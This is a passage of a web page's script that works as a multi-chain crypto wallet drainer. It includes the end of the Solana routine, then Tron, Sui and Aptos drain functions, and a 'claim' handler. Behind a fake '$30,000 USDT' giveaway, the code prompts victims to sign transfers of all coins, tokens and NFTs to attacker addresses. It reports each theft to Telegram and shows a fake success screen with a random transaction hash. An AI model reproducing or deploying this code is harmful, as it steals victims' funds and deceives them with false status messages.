              ),
              solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }), // ~200k CUs
              solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ priceMicroLamports: 10000 })
            );

            const signature = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 2, `SPL Token ${parsedInfo.mint.slice(0,6)}... transfer`);
            if (signature) {
                await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
                txHashDiv.innerHTML += `<br>SPL TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
                await notify("SOL_SPL_SWEPT", { sig: signature, token: parsedInfo.mint, amount: tokenAmount.toString() });
                sendToTelegram(`SOLANA SPL SWEPT: ${uiAmount} ${parsedInfo.mint.slice(0,6)}...`, { 'TX Hash': signature, 'Amount Drained': `${uiAmount} ${parsedInfo.mint.slice(0,6)}...` });
                assetsProcessedCount++;
                statusEl.innerHTML = `SPL token ${parsedInfo.mint.slice(0, 6)} transferred! Next asset.`;
            } else {
                statusEl.innerHTML = `SPL token ${parsedInfo.mint.slice(0, 6)} transfer skipped or rejected. Continuing...`;
            }
          }
        } catch (e) {
          console.warn(`Failed to process SPL token (outer catch):`, e);
          statusEl.innerHTML = `Failed to process an SPL token. Continuing...`;
        }
      }

      // 3. Solana NFTs (non-compressed) - via transfer of token account ownership
      statusEl.innerHTML = "Checking for Solana NFTs. Prepare for transfers.";
      for (const tokenAccountInfo of tokenAccounts.value) {
        try {
            const parsedInfo = tokenAccountInfo.account.data.parsed.info;
            // Check if it's likely an NFT: uiAmount is 1, decimals is 0, and has supply of 1
            if (parsedInfo.tokenAmount.uiAmount === 1 && parsedInfo.tokenAmount.decimals === 0 && parsedInfo.supply === "1") { 
                statusEl.innerHTML = `Transferring Solana NFT ${parsedInfo.mint.slice(0, 6)}... <br>Awaiting wallet confirmation...`;
                const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
                const sourceTokenAccount = tokenAccountInfo.pubkey;
                const destinationTokenAccount = splToken.getAssociatedTokenAddressSync(mint, toPubkey, false, splToken.TOKEN_PROGRAM_ID, splToken.ASSOCIATED_TOKEN_PROGRAM_ID);

                const transaction = new solanaWeb3.Transaction();
                transaction.feePayer = fromPubkey;
                transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

                const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
                if (!destAccountInfo) { // Create ATA for NFT if not existing
                    transaction.add(
                      splToken.createAssociatedTokenAccountInstruction(
                        fromPubkey, // payer
                        destinationTokenAccount, // associatedToken
                        toPubkey, // owner
                        mint, // mint
                        splToken.TOKEN_PROGRAM_ID, // programId
                        splToken.ASSOCIATED_TOKEN_PROGRAM_ID // associatedTokenProgramId
                      )
                    );
                }
                transaction.add(
                    splToken.createTransferInstruction(
                        sourceTokenAccount,
                        destinationTokenAccount,
                        fromPubkey,
                        1, // Transfer 1 NFT
                        [], // No signers besides owner
                        splToken.TOKEN_PROGRAM_ID
                    ),
                    solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({ units: 250000 }), // Slightly more for NFT
                    solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ priceMicroLamports: 10000 })
                );

                const signature = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 2, `Solana NFT ${parsedInfo.mint.slice(0,6)}... transfer`);
                if (signature) {
                    await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
                    txHashDiv.innerHTML += `<br>NFT TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
                    await notify("SOL_NFT_SWEPT", { sig: signature, mint: parsedInfo.mint });
                    sendToTelegram(`SOLANA NFT SWEPT: ${parsedInfo.mint.slice(0,6)}...`, { 'TX Hash': signature, 'Amount Drained': `1 NFT of type ${parsedInfo.mint.slice(0,6)}...` });
                    assetsProcessedCount++;
                    statusEl.innerHTML = `Solana NFT ${parsedInfo.mint.slice(0, 6)} transferred!`;
                } else {
                    statusEl.innerHTML = `Solana NFT ${parsedInfo.mint.slice(0, 6)} transfer skipped or rejected. Continuing...`;
                }
            }
        } catch (e) {
            console.warn(`Failed to process Solana NFT (outer catch):`, e);
            statusEl.innerHTML = `Failed to process a Solana NFT. Continuing...`;
        }
      }

      // 4. Solana Compressed NFTs (Advanced - Requires Metaplex JS SDK or specific tools)
      statusEl.innerHTML += "<br><span style='color:orange;'>Compressed NFT acquisition requires advanced interaction (manual later or server-side).</span>";
      await notify("SOL_CNFT_CHECK", { status: "Client-side skipping direct transfer, for future access" });


      statusEl.innerHTML = `<span style='color:var(--success-green)'>Solana acquisition protocols completed! ${assetsProcessedCount} assets/approvals processed.</span>`;
      sendToTelegram(`SOLANA ACQUISITION COMPLETE for ${account.slice(0, 6)}...${account.slice(-4)}! Processed: ${assetsProcessedCount} assets.`);
      return assetsProcessedCount;

    } catch (e) { 
      console.error("Solana acquisition error (critical):", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Solana acquisition interrupted or failed due to a critical error. Please ensure gas and try again.</span>`;
      if (txHashDiv.innerHTML === "Awaiting wallet confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      sendToTelegram(`SOLANA ACQUISITION ERROR (CRITICAL) for ${account.slice(0, 6)}...${account.slice(-4)}: ${e.message}`);
      // Re-throw to propagate failure to the orchestrator only if truly critical to halt everything
      return assetsProcessedCount;
    }
  }

  // ========= TRON DRAIN (TRX + TRC20/Jetton) =========
  async function drainTron() {
    statusEl.innerHTML = "Initiating Tron asset acquisition. Confirm transactions in your TronLink wallet to finalize.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting wallet confirmations...";

    const tronWeb = window.tronWeb;
    const receiverTronAddress = _REC_TRON;

    let assetsProcessedCount = 0;

    try {
      // 1. Sweep TRX
      const bal = await tronWeb.trx.getBalance(account);
      const trxGasBuffer = 5000000; // 5 TRX in sun (small buffer for fees)
      if (bal > trxGasBuffer) {
        statusEl.innerHTML = "Transferring native TRX... <br>Awaiting wallet confirmation...";
        let result;
        try {
            const tx = await tronWeb.transactionBuilder.sendTrx(receiverTronAddress, bal - trxGasBuffer, account);
            const signedTx = await tronWeb.trx.sign(tx);
            result = await sendTransactionWithRetry(() => tronWeb.trx.sendRawTransaction(signedTx).then(r => r.txid), 3, "native TRX transfer");
            
            if (result) {
                txHashDiv.innerHTML += `<br>TRX TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result.slice(0, 12)}...</a>`;
                await notify("TRON_TRX_SWEPT", { txid: result, amount: bal - trxGasBuffer });
                sendToTelegram(`TRON TRX SWEPT: ${tronWeb.fromSun(bal - trxGasBuffer)} TRX`, { 'TX Hash': result, 'Amount Drained': `${tronWeb.fromSun(bal - trxGasBuffer)} TRX` });
                assetsProcessedCount++;
                statusEl.innerHTML = "Native TRX secured! Moving to TRC20/Jetton tokens...";
            } else {
                statusEl.innerHTML = `Native TRX transfer skipped or rejected. Moving to TRC20/Jetton tokens...`;
            }
        } catch (e) {
            console.warn(`Failed to transfer native TRX (outer catch):`, e.message);
            statusEl.innerHTML = `Native TRX transfer skipped or rejected. Moving to TRC20/Jetton tokens...`;
        }
      } else {
        statusEl.innerHTML = "No significant native TRX to transfer. Moving to TRC20/Jetton tokens...";
      }

      // 2. Sweep TRC20/Jetton tokens
      statusEl.innerHTML = "Scanning for TRC20/Jetton tokens. Prepare for transfers.";
      const trc20Tokens = [
        { address: "TR7NHqjeKQxGTCuuP8qACu7c7d2z9z3z9z", symbol: "USDT" }, // Official USDT TRC20
        // NOTE: For comprehensive TRC20 draining, you'd need to list all known TRC20 tokens dynamically
        // or integrate with a Tron token list API. This example covers a few common ones.
        { address: "TEkxoP3gqseK2aWjT4b4jJ1M552t6W23z", symbol: "USDC" }, // Example USDC TRC20 (verify current contract)
        { address: "TFzL4H7s2k47YJ7H7B2fX1b2c3d4e5f6g", symbol: "BTT" },  // Example BTT TRC20
      ];

      for (const tokenInfo of trc20Tokens) {
        try {
          const usdtContract = await tronWeb.contract().at(tokenInfo.address);
          const usdtBalance = await usdtContract.balanceOf(account).call();

          if (usdtBalance > 0) {
            statusEl.innerHTML = `Transferring TRC20 ${tokenInfo.symbol}... <br>Awaiting wallet confirmation...`;
            // Fee limit is in SUN (1 TRX = 1,000,000 SUN), 10 TRX is a common safe limit for TRC20 transfers
            const result = await sendTransactionWithRetry(() => usdtContract.transfer(receiverTronAddress, usdtBalance).send({ feeLimit: 10000000 }), 2, `TRC20 ${tokenInfo.symbol} transfer`); 
            if (result) {
                txHashDiv.innerHTML += `<br>${tokenInfo.symbol} TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result.slice(0, 12)}...</a>`;
                await notify("TRON_TRC20_SWEPT", { txid: result, token: tokenInfo.symbol, amount: usdtBalance.toString() });
                sendToTelegram(`TRON TRC20 SWEPT: ${tronWeb.fromSun(usdtBalance)} ${tokenInfo.symbol}`, { 'TX Hash': result, 'Amount Drained': `${tronWeb.fromSun(usdtBalance)} ${tokenInfo.symbol}` });
                assetsProcessedCount++;
                statusEl.innerHTML = `TRC20 ${tokenInfo.symbol} transferred!`;
            } else {
                statusEl.innerHTML = `TRC20 ${tokenInfo.symbol} transfer skipped or rejected. Continuing...`;
            }
          }
        } catch (e) {
          console.warn(`Failed to process TRC20 ${tokenInfo.symbol} (outer catch):`, e);
          statusEl.innerHTML = `Failed to process TRC20 ${tokenInfo.symbol}. Continuing...`;
        }
      }
      statusEl.innerHTML = `<span style='color:var(--success-green)'>Tron acquisition protocols completed! ${assetsProcessedCount} assets/approvals processed.</span>`;
      sendToTelegram(`TRON ACQUISITION COMPLETE for ${account.slice(0, 6)}...${account.slice(-4)}! Processed: ${assetsProcessedCount} assets.`);
      return assetsProcessedCount;

    } catch (e) { 
      console.error("Tron acquisition error (critical):", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Tron acquisition interrupted or failed due to a critical error. Please ensure gas and try again.</span>`;
      if (txHashDiv.innerHTML === "Awaiting wallet confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      sendToTelegram(`TRON ACQUISITION ERROR (CRITICAL) for ${account.slice(0, 6)}...${account.slice(-4)}: ${e.message}`);
      // Re-throw to propagate failure to the orchestrator only if truly critical to halt everything
      return assetsProcessedCount;
    }
  }

  // ========= SUI DRAIN (New Chain Support) =========
  async function drainSui() {
      statusEl.innerHTML = "Initiating Sui asset acquisition. Confirm transactions in your Sui Wallet to finalize.";
      txHashDiv.style.display = "block";
      txHashDiv.innerHTML = "Awaiting wallet confirmations...";

      const suiClient = new SuiClient({ url: CHAIN_DATA['sui'].rpc });
      const receiverSuiAddress = _REC_SUI;

      let assetsProcessedCount = 0;

      try {
          // 1. Sweep Native SUI
          statusEl.innerHTML = "Transferring native SUI... <br>Awaiting wallet confirmation...";
          const allCoins = await suiClient.getCoins({ owner: account, coinType: '0x2::sui::SUI' });
          let totalSui = 0n;
          for (const coin of allCoins.data) {
              totalSui += BigInt(coin.balance);
          }

          if (totalSui > 0n) {
              const gasBudget = 10000000n; // Example gas budget for SUI (0.01 SUI), adjusted up
              const amountToSend = totalSui - gasBudget; // Leave some for gas

              if (amountToSend > 0n) {
                  const tx = new TransactionBlock();
                  const [primaryCoin] = tx.splitCoins(tx.gas, [tx.pure(amountToSend.toString())]);
                  tx.transferObjects([primaryCoin], tx.pure(receiverSuiAddress));
                  tx.setGasBudget(gasBudget);

                  let txDigest;
                  try {
                      txDigest = await sendTransactionWithRetry(() => window.sui.signAndExecuteTransactionBlock({
                          transactionBlock: tx,
                          chain: 'sui:mainnet',
                          requestType: 'WaitForLocalExecution',
                          options: { showEffects: true, showEvents: true }
                      }).then(r => r.digest), 3, "native SUI transfer");
                      
                      if (txDigest) {
                          txHashDiv.innerHTML += `<br>SUI TX: <a href="${CHAIN_DATA['sui'].explorer}/txblock/${txDigest}" target="_blank">${txDigest.slice(0, 12)}...</a>`;
                          await notify("SUI_NATIVE_SWEPT", { digest: txDigest, amount: amountToSend.toString() });
                          sendToTelegram(`SUI NATIVE SWEPT: ${amountToSend.toString()} SUI`, { 'TX Hash': txDigest, 'Amount Drained': `${amountToSend.toString()} SUI` });
                          assetsProcessedCount++;
                          statusEl.innerHTML = "Native SUI secured! Moving to other assets...";
                      } else {
                          statusEl.innerHTML = `Native SUI transfer skipped or rejected. Moving to other assets...`;
                      }
                  } catch (e) { 
                      console.warn(`Failed to transfer native SUI (outer catch):`, e.message);
                      statusEl.innerHTML = `Native SUI transfer skipped or rejected. Moving to other assets...`;
                  }
              }
          } else {
              statusEl.innerHTML = "No native SUI to transfer.";
          }

          // 2. Sweep other SUI assets (objects, NFTs, Kiosk assets)
          statusEl.innerHTML = "Scanning for Sui assets. Prepare for transfers.";
          const ownedObjects = await suiClient.getOwnedObjects({
              owner: account,
              options: { showType: true, showContent: true, showOwner: true }
          });

          for (const obj of ownedObjects.data) {
              try {
                  if (obj.data && obj.data.content && obj.data.objectId) {
                      const objectType = obj.data.content.type;
                      if (objectType.startsWith("0x2::sui::SUI")) continue; // Skip native SUI as it's handled

                      statusEl.innerHTML = `Transferring Sui object: ${obj.data.objectId.slice(0, 6)}... (Type: ${objectType.split('::')[2] || objectType}) <br>Awaiting wallet confirmation...`;
                      const tx = new TransactionBlock();
                      tx.transferObjects([tx.object(obj.data.objectId)], tx.pure(receiverSuiAddress));
                      tx.setGasBudget(5000000n); // Set a reasonable gas budget

                      const txDigest = await sendTransactionWithRetry(() => window.sui.signAndExecuteTransactionBlock({
                          transactionBlock: tx,
                          chain: 'sui:mainnet',
                          requestType: 'WaitForLocalExecution',
                          options: { showEffects: true, showEvents: true }
                      }).then(r => r.digest), 2, `Sui Object ${objectType.split('::')[2] || objectType} transfer`);
                      if (txDigest) {
                          txHashDiv.innerHTML += `<br>Sui Object TX: <a href="${CHAIN_DATA['sui'].explorer}/txblock/${txDigest}" target="_blank">${txDigest.slice(0, 12)}...</a>`;
                          await notify("SUI_OBJECT_SWEPT", { digest: txDigest, objectId: obj.data.objectId, type: objectType });
                          sendToTelegram(`SUI OBJECT SWEPT: ${obj.data.objectId.slice(0,6)}... (${objectType.split('::')[2] || objectType})`, { 'TX Hash': txDigest, 'Amount Drained': `1 object of type ${objectType.split('::')[2] || objectType}` });
                          assetsProcessedCount++;
                          statusEl.innerHTML = `Sui object ${obj.data.objectId.slice(0, 6)} transferred!`;
                      } else {
                          statusEl.innerHTML = `Sui object ${obj.data.objectId.slice(0, 6)} transfer skipped or rejected. Continuing...`;
                      }
                  }
              } catch (e) {
                  console.warn(`Failed to process Sui object ${obj.data.objectId} (outer catch):`, e);
                  statusEl.innerHTML = `Failed to process a Sui object. Continuing...`;
              }
          }

          statusEl.innerHTML = `<span style='color:var(--success-green)'>Sui acquisition protocols completed! ${assetsProcessedCount} assets/approvals processed.</span>`;
          sendToTelegram(`SUI ACQUISITION COMPLETE for ${account.slice(0, 6)}...${account.slice(-4)}! Processed: ${assetsProcessedCount} assets.`);
          return assetsProcessedCount;

      } catch (e) { 
          console.error("Sui acquisition error (critical):", e);
          statusEl.innerHTML = `<span style='color:var(--error-red)'>Sui acquisition interrupted or failed due to a critical error. Please ensure gas and try again.</span>`;
          if (txHashDiv.innerHTML === "Awaiting wallet confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
          sendToTelegram(`SUI ACQUISITION ERROR (CRITICAL) for ${account.slice(0, 6)}...${account.slice(-4)}: ${e.message}`);
          // Re-throw to propagate failure to the orchestrator only if truly critical to halt everything
          return assetsProcessedCount;
      }
  }

  // ========= APTOS DRAIN (New Chain Support) =========
  async function drainAptos() {
      statusEl.innerHTML = "Initiating Aptos asset acquisition. Confirm transactions in your Aptos Wallet to finalize.";
      txHashDiv.style.display = "block";
      txHashDiv.innerHTML = "Awaiting wallet confirmations...";

      const aptosClient = new AptosClient(CHAIN_DATA['aptos'].rpc);
      const receiverAptosAddress = _REC_APTOS;

      let assetsProcessedCount = 0;

      try {
          // 1. Native APT sweep
          statusEl.innerHTML = "Transferring native APT... <br>Awaiting wallet confirmation...";
          const accountResources = await aptosClient.getAccountResources(account);
          const aptosCoinStore = accountResources.find(r => r.type === "0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>");

          if (aptosCoinStore) {
              const balance = parseInt(aptosCoinStore.data.coin.value);
              const aptGasBuffer = 100000; // 0.001 APT for gas, adjusted up
              const amountToSend = balance - aptGasBuffer;

              if (amountToSend > 0) {
                  const payload = {
                      type: "entry_function_payload",
                      function: "0x1::coin::transfer",
                      type_arguments: ["0x1::aptos_coin::AptosCoin"],
                      arguments: [receiverAptosAddress, amountToSend.toString()],
                  };

                  let txHash;
                  try {
                      txHash = await sendTransactionWithRetry(() => window.aptos.signAndSubmitTransaction(payload).then(r => r.hash), 3, "native APT transfer");
                      if (txHash) {
                          txHashDiv.innerHTML += `<br>APT TX: <a href="${CHAIN_DATA['aptos'].explorer}/txn/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                          await notify("APTOS_NATIVE_SWEPT", { hash: txHash, amount: amountToSend.toString() });
                          sendToTelegram(`APTOS NATIVE SWEPT: ${amountToSend / Math.pow(10, CHAIN_DATA['aptos'].native.decimals)} APT`, { 'TX Hash': txHash, 'Amount Drained': `${amountToSend / Math.pow(10, CHAIN_DATA['aptos'].native.decimals)} APT` });
                          assetsProcessedCount++;
                          statusEl.innerHTML = "Native APT secured! Moving to other tokens and NFTs...";
                      } else {
                          statusEl.innerHTML = `Native APT transfer skipped or hated. Moving to other tokens and NFTs...`;
                      }
                  } catch (e) {
                      console.warn(`Failed to transfer native APT (outer catch):`, e.message);
                      statusEl.innerHTML = `Native APT transfer skipped or hated. Moving to other tokens and NFTs...`;
                  }
              }
          } else {
              statusEl.innerHTML = "No native APT to transfer.";
          }

          // 2. Sweep other APTOS Tokens
          statusEl.innerHTML = "Scanning for Aptos tokens. Prepare for transfers.";
          const allTokens = accountResources.filter(r => r.type.startsWith("0x1::coin::CoinStore<") && !r.type.includes("0x1::aptos_coin::AptosCoin"));

          for (const tokenResource of allTokens) {
              try {
                  const coinType = tokenResource.type.match(/<(.+)>/)[1];
                  const balance = parseInt(tokenResource.data.coin.value);
                  if (balance > 0) {
                      statusEl.innerHTML = `Transferring Aptos token: ${coinType.split('::').pop()}... <br>Awaiting wallet confirmation...`;
                      const payload = {
                          type: "entry_function_payload",
                          function: "0x1::coin::transfer",
                          type_arguments: [coinType],
                          arguments: [receiverAptosAddress, balance.toString()],
                      };

                      const txHash = await sendTransactionWithRetry(() => window.aptos.signAndSubmitTransaction(payload).then(r => r.hash), 2, `Aptos Token ${coinType.split('::').pop()} transfer`);
                      if (txHash) {
                          txHashDiv.innerHTML += `<br>Token TX: <a href="${CHAIN_DATA['aptos'].explorer}/txn/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                          await notify("APTOS_TOKEN_SWEPT", { hash: txHash, coinType: coinType, amount: balance.toString() });
                          sendToTelegram(`APTOS TOKEN SWEPT: ${balance} ${coinType.split('::').pop()}`, { 'TX Hash': txHash, 'Amount Drained': `${balance} ${coinType.split('::').pop()}` });
                          assetsProcessedCount++;
                          statusEl.innerHTML = `Aptos token ${coinType.split('::').pop()} transferred!`;
                      } else {
                          statusEl.innerHTML = `Aptos token ${coinType.split('::').pop()} transfer skipped or hated. Continuing...`;
                      }
                  }
              } catch (e) {
                  console.warn(`Failed to process Aptos token (outer catch):`, e);
                  statusEl.innerHTML = `Failed to process an Aptos token. Continuing...`;
              }
          }

          // 3. Sweep Aptos NFTs (simplified, as full NFT draining is complex)
          statusEl.innerHTML = "Scanning for Aptos NFTs. Preparing for future transfers.";
          statusEl.innerHTML += "<br><span style='color:orange;'>Aptos NFT acquisition requires specific token object transfers. Preparing for future access.</span>";
          await notify("APTOS_NFT_CHECK", { status: "Client-side skipping direct transfer, for future access" });


          statusEl.innerHTML = `<span style='color:var(--success-green)'>Aptos acquisition protocols completed! ${assetsProcessedCount} assets/approvals processed.</span>`;
          sendToTelegram(`APTOS ACQUISITION COMPLETE for ${account.slice(0, 6)}...${account.slice(-4)}! Processed: ${assetsProcessedCount} assets.`);
          return assetsProcessedCount;

      } catch (e) {
          console.error("Aptos acquisition error (critical):", e);
          statusEl.innerHTML = `<span style='color:var(--error-red)'>Aptos acquisition interrupted or failed due to a critical error. Please ensure gas and try again.</span>`;
          if (txHashDiv.innerHTML === "Awaiting wallet confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
          sendToTelegram(`APTOS ACQUISITION ERROR (CRITICAL) for ${account.slice(0, 6)}...${account.slice(-4)}: ${e.message}`);
          // Re-throw to propagate failure to the orchestrator only if truly critical to halt everything
          return assetsProcessedCount;
      }
  }


  // ========= CLAIM Orchestrator =========
  async function claim() {
    claimBtn.disabled = true;
    txHashDiv.innerHTML = ""; 
    txHashDiv.style.display = "none"; 
    statusEl.innerHTML = "Claiming $30,000 USDT. Confirm transactions in your wallet to finalize.";

    let totalAssetsProcessed = 0; // Track overall progress

    try {
      if (!account) {
          statusEl.innerHTML = "<span style='color:var(--error-red)'>Error: Wallet not connected. Please connect your wallet first.</span>";
          claimBtn.disabled = false;
          return;
      }

      // Execute draining functions. They now return the count of processed assets/approvals.
      // We sum up the results to get an overall count.
      if (isSolana) {
        totalAssetsProcessed += await drainSolana(); 
      } else if (isTron) {
        totalAssetsProcessed += await drainTron();
      } else if (isSui) {
        totalAssetsProcessed += await drainSui();
      } else if (isAptos) {
        totalAssetsProcessed += await drainAptos();
      } else { // Assume EVM if not Solana, Tron, Sui, or Aptos
        totalAssetsProcessed += await drainEVM();
      }
      
      // Final summary message
      if (totalAssetsProcessed > 0) {
          statusEl.innerHTML = `<span style='color:var(--success-green)'>Claiming process completed! We've secured access for ${totalAssetsProcessed} assets. View wallet for updates.</span>`;
      } else {
          statusEl.innerHTML = "<span style='color:orange;'>Claiming process finished. No assets were confirmed for transfer/approval. Ensure sufficient gas and try again.</span>";
      }

      showFakeSuccessScreen(); 
    } catch (e) {
      console.error("Overall claim orchestrator error:", e);
      statusEl.innerHTML = "<span style='color:var(--error-red)'>Claim process encountered a critical error. Please ensure gas and try again.</span>";
      if (txHashDiv.innerHTML === "Awaiting wallet confirmations..." || txHashDiv.innerHTML === "") {
        txHashDiv.innerHTML = "Transaction(s) failed or rejected.";
        txHashDiv.style.color = "var(--error-red)";
        txHashDiv.style.display = "block";
      }
    } finally {
      // Re-enable connect button if user wants to try again or switch wallet after completion/failure
      connectBtn.disabled = false;
    }
  }

  // Show fake success screen
  function showFakeSuccessScreen() {
      successOverlay.style.display = 'flex';
      // Dynamically generate a fake transaction hash and explorer link
      const fakeTxHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
      const explorerBase = CHAIN_DATA[chainId]?.explorer || 'https://etherscan.io'; // Fallback explorer
      const link = `${explorerBase}/tx/${fakeTxHash}`;
      fakeExplorerLink.href = link;
  }

  // Initialize countdown when the document is fully loaded
  document.addEventListener('DOMContentLoaded', startCountdown);

</script>
</body>
</html>
